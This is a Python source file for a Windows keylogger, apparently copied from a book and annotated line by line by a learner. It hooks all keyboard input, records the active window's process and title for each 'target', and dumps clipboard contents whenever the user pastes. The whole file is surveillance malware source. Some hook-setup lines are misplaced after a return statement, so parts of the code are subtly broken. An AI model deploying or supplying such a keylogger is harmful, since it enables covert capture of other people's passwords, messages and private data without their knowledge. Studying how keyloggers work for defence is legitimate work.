''' 
This is not my script I found it in book But I wanted to learn 
how things were working so I documented whole script and 
now it is easy to understand this code .
.............................................................
......@@Paranoid0x0x
'''
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard

'''we just put in some helper variables and a function that 
will capture the active window and its associated process ID'''
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
def get_current_process():
	# get a handle to the foreground window
	'''which returns a handle to the active window on the 
	target’s desktop.'''
	hwnd = user32.GetForegroundWindow()
	# find the process ID
	pid = c_ulong(0)
	'''we pass that handle to the GetWindowThreadProcessId 
	function to retrieve the window’s process ID.'''
	user32.GetWindowThreadProcessId(hwnd, byref(pid))
	# store the current process ID
	process_id = "%d" % pid.value
	# grab the executable
	executable = create_string_buffer("\x00" * 512)
	'''We then open the process 
	and, using the resulting process handle, we find the actual executable 
	name  of the process'''
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
	# now read its title
	window_title = create_string_buffer("\x00" * 512)
	'''grab the full text of the window’s title bar using the GetWindowTextA function'''
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)
	# print out the header if we're in the right process
	print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
	# close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window
	# check to see if target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process() 
	# if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		print (chr(event.Ascii)),
	else:
		# if [Ctrl-V], get the value on the clipboard
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			print ("[PASTE] - %s" % (pasted_value)),
		else:
			print ("[%s]" % event.Key,)
			# pass execution to next hook registered
	return True
	# create and register a hook manager
	kl= pyHook.HookManager() # We define our PyHook HookManager
	kl.KeyDown = KeyStroke 
	'''binded the KeyDown event to our user-defined callback function KeyStroke '''
	# register the hook and execute forever
	'''We then instruct PyHook to hook all keypresses and continue execution'''
	kl.HookKeyboard()
	pythoncom.PumpMessages()
	''' whole working process is illustrated Below:
		
		1. Whenever the target presses a key on the keyboard, our KeyStroke function 
		is called with an event object as its only parameter
		2. The first thing we do is check if the user has changed windows  and if so, 
		we acquire the new window’s name and process information
		3. We then look at the keystroke that was issued  and if it falls within the 
		ASCII-printable range, we simply print it out.
		4.  If it’s a modifier (such as the shift, ctrl, or alt keys) or any 
		other nonstandard key, we grab the key name from the event object.
		5. We also check if the user is performing a paste operation , and if so we dump 
		the contents of the clipboard. The callback function wraps up by returning 
		True to allow the next hook in the chain—if there is one—to process the event
 	 '''